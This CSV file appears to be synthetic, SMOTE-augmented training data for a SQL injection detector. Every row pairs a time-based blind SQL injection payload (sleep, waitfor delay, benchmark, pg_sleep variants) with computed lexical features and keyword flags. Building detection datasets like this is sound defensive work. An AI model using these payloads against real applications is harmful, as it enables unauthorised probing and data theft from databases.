id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000245,attack,time,"1%""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000372,0.03759813609709853,42.04145580791636,15.0,2.536087588253363,8.04145580791636,2.0,24.0,8.0,0.1912389055569027,0.047574182026064546,0.5708901843127745,0.19029672810425818,0.0,1.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,5.0,1.0,0.0,0.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9792720960418199,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.97927209604182
SMOTE_000246,attack,time,"1'||  (  select 'jrbp' from dual where 4129  =  4129 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000818,0.12291760034043453,117.51900611720936,34.80760244688374,4.1853611446788435,39.61520489376748,27.0,36.903801223441874,14.0,0.3369298440659282,0.22983261415845474,0.3140650751749368,0.11917246660068023,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.0,0.0,0.0,1.0,4.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.9999999999999999,1.0,0.0,1.0,0.9519006117209359,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.951900611720936
SMOTE_000247,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000657,0.06550456177100322,104.32551810714459,28.0,3.328036108228026,33.26041448571567,10.0,49.06510362142892,12.0,0.31868598253868574,0.09587928634687534,0.4703795874981884,0.11505514361625041,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,9.0,0.0,0.0,0.0,2.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.9674481892855408,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.967448189285541
SMOTE_000248,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000701,1.684571729979368,26.555951306041095,18.51119026120822,4.076947669844865,14.044761044832876,4.0,3.5111902612082204,5.0,0.5264408755797355,0.1519772913445914,0.1316102188949339,0.18997161418073927,2.0,0.4888097387917808,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.48880973879178086,2.7755575615628914e-17,0.5111902612082191,0.0,0.0,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000249,attack,time,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000355,0.17013119946072042,89.62286108616586,19.0,2.8059088990164085,27.0,2.0,47.68571757180488,12.937143514360976,0.302602027613284,0.022414965008391408,0.5307313057200493,0.14425170165827525,0.0,1.0,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,9.937143514360976,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000250,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,0.5014707371555425,56.19373598493027,17.49134399768158,2.9460634954609786,13.75432800115921,9.245671998840791,27.702391987248696,5.4913439976815805,0.24764639230200522,0.16531646428650354,0.48981800334503256,0.09721914006645867,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.4913439976815805,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.7543280011592097,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7543280011592097
SMOTE_000251,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000260,0.23480862493221258,83.5015881373202,24.87460296566995,3.2182457782586216,30.0,2.0,39.501588137320205,12.0,0.3593619105221429,0.023957460701476196,0.4729358645675238,0.14374476420885715,0.0,1.0,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.125397034330051,0.8746029656699489,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000252,attack,time,"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000493,1.5992759843720132,84.07237228740973,27.503618614370488,3.8151531694627856,19.503618614370488,26.02894891496389,29.532567529334383,9.007237228740973,0.23460217136323044,0.3083021893881993,0.34985633841079655,0.10723930083777375,0.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,1.5036186143704868,8.673617379884035e-19,4.503618614370487,0.0,0.0,1.0,3.503618614370487,0.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.503618614370487,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.503618614370487
SMOTE_000253,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.29227567604104593,76.47600058389014,24.130999854027465,3.3939110689445666,16.0,18.0,33.47600058389014,9.0,0.2092837556765269,0.23544422513609276,0.43754990661933396,0.11772211256804638,0.13099985402746395,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,4.869000145972536,0.0,0.0,1.0,2.0,0.1309998540274641,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000254,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.1930316917063026,41.05814618798274,23.890903851173935,4.26903860493278,19.38543463446095,2.1781807702347873,7.138169242817444,12.356361540469573,0.46607034086890653,0.05470808885393459,0.16130235716716212,0.3179192131099967,2.3563615404695737,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,1.1781807702347864,0.0,3.46545768929564,1.0,2.3563615404695737,1.0,0.0,1.0,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.17818077023478673,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1781807702347864
SMOTE_000255,attack,time,1 rlike sleep  (  5  )  # urxh,nearest_attack_euclidean,R000754,0.07134424886860267,29.956509378417806,15.913018756835616,3.341519880269406,14.043490621582192,1.9565093784178078,10.95650937841781,2.999999999999999,0.468866192355881,0.06526696850080299,0.3657168714826877,0.10014996766062825,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.04349062158219286,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0434906215821926
SMOTE_000256,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000962,0.7672533865438607,56.306351936653314,20.845952790497996,3.4063668558432227,15.691905580995996,10.0,23.383811161991986,7.230635193665332,0.2779714567911875,0.1835711934067709,0.40908595885695825,0.12937139094508335,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.2306351936653317,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000257,attack,time,"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000464,0.26250887608571455,83.96829079275271,23.0,3.0953652670570957,28.0,2.0,41.37463263420217,12.593658158550543,0.3337478980480798,0.02383913557486285,0.4924751510842693,0.14993781529278802,0.0,1.0,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.593658158550543,1.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000258,attack,time,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000574,0.5229841231410997,93.4978721285917,23.0,2.9364495082910946,28.0,2.0,49.24822677382641,14.249645354765283,0.3006715211674694,0.021476537226247816,0.5255029664237812,0.15234897518250146,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,10.249645354765283,1.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000259,attack,time,"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000855,0.2532988914861151,108.26688931383323,31.66988367882538,3.7870776659131615,25.504825518238068,30.0,41.009651036476136,11.752412759119034,0.23540262357982872,0.2780381328483149,0.3781258695435525,0.10843337402830386,0.0,0.9174709197063445,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.834941839412689,0.0,0.0,1.0,4.0,0.0,0.9174709197063445,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000260,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000475,0.2936403300346402,69.91990499145122,26.338806763197276,3.6355243127760555,24.016420289591824,10.0,28.67761352639455,7.2258711754648495,0.34255341953094565,0.14373718859610515,0.41043605190903026,0.1032733399639189,0.11293558773242474,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.112935587732425,0.0,1.0,0.0,1.0,0.1129355877324249,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000261,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",nearest_attack_euclidean,R000346,1.1169448433987719,73.4236403333522,27.5763596666478,3.8459745280170834,19.0,21.4236403333522,25.0,8.0,0.25878393810927586,0.2917492220167187,0.34050518172273136,0.10896165815127404,0.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.4236403333521994,0.5763596666478006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000262,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000501,0.007022969029256283,101.0209336007328,29.006280080219845,3.847027986528501,28.004186720146564,27.004186720146564,36.006280080219845,10.006280080219843,0.2772131583189978,0.2673140354575878,0.3564250003100368,0.09904780591337758,1.0020933600732813,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.002093360073282,0.0,0.0,1.0,2.0041867201465626,1.0,0.0,2.7755575615628914e-17,0.9979066399267185,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.002093360073281425,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0020933600732813
SMOTE_000263,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000925,0.4636634796365015,46.61591281380104,18.52318256276021,3.4301988383174336,22.0,1.0,17.092730251040834,6.523182562760208,0.473307012104071,0.02151395509563958,0.3654181070680802,0.13976092573220913,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.5231825627602085,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000264,attack,time,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000309,0.4666060672337644,70.16060747816239,23.279797507279202,3.6008826820039146,23.279797507279202,10.0,26.160607478162394,10.720202492720798,0.3324315603508317,0.14266390578946395,0.3722788145263587,0.15262571933334568,3.860101246360399,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.860101246360399,0.0,0.0,0.0,2.860101246360399,1.0,0.0,2.7755575615628914e-17,0.13989875363960122,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8601012463603988,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.860101246360399
SMOTE_000265,attack,time,"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000955,0.9130922147726496,119.60929263568195,30.609292635681953,3.353294795396146,39.0,10.0,57.0,13.609292635681953,0.32606705792775936,0.08360693793019472,0.47655954620210983,0.11376645793993607,0.0,0.6092926356819536,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,10.0,0.0,0.0,0.0,2.0,0.0,0.6092926356819536,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000266,attack,time,1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  1601  =  1601,nearest_attack_euclidean,R000266,0.02745901005609746,129.89552089494413,23.018996200919247,2.8041298732228834,30.990501899540376,10.0,72.92401519632301,15.981003799080751,0.23859108592094252,0.07699061351328756,0.5613929508850077,0.12302534968076223,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,13.981003799080753,0.0,0.0,0.0,2.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.9905018995403756,0.009498100459624403,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000267,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.014701211970465757,65.92283999597892,21.022045715434594,3.2961531161925777,21.0,10.0,27.93386285369622,6.988977142282703,0.31859793530673924,0.1517133025270187,0.42367627849423234,0.10601248367200974,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.988977142282703,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000268,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,1.1377030952813523,42.47690440459006,19.476904404590055,3.424996404202741,12.0,4.0,17.0,9.476904404590053,0.282545485683787,0.09418182856126234,0.40027277138536493,0.22299991436958566,2.0,0.47690440459005334,2.0,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,3.0,0.0,0.0,0.0,2.0,1.0,0.47690440459005334,1.0,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000269,attack,time,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000414,0.10846885010103251,63.886217088188296,17.82932563228244,2.6716933958991937,12.886217088188294,2.0,36.0,13.0,0.20166256842177493,0.031307350257969616,0.563532304643453,0.20349777667680247,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,6.0,2.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0568914559058533,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0568914559058533
SMOTE_000270,attack,time,1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000971,1.0078304507107827,92.70677144552855,24.0,3.239182975776953,36.198657152674414,2.0,42.944600006247356,11.563514286606765,0.388443219409979,0.021804691754279515,0.46424693481485996,0.12550515402088153,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.563514286606765,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.5635142866067652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.563514286606765
SMOTE_000271,attack,time,select sleep  (  5  )   and 'hhrw' like 'hhrw,nearest_attack_euclidean,R001049,0.4093621511507469,45.47693348664522,19.23846674332261,3.6617608538345223,25.76153325667739,1.2384667433226095,13.238466743322611,5.23846674332261,0.5668410051525801,0.027070482251949052,0.2910311433206286,0.11505736927484224,3.23846674332261,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.7615332566773898,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.76153325667739
SMOTE_000272,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000719,0.48133531789262785,92.82145662766587,20.5356301170024,2.8940778513043557,13.821456627665867,18.0,50.0,11.0,0.1488890922844324,0.193924004289623,0.5386777896933972,0.1185091137325474,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,8.0,0.0,0.0,1.0,2.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8214566276658668,0.17854337233413295,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,time,"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000920,0.9761487548118628,102.4577456427685,29.4577456427685,3.897892527515719,26.0,30.0,36.0,10.4577456427685,0.25376914270778783,0.29281054927821676,0.35137265913386007,0.10204764888013534,0.45774564276849994,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.0,0.0,0.0,1.0,4.0,0.45774564276850005,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
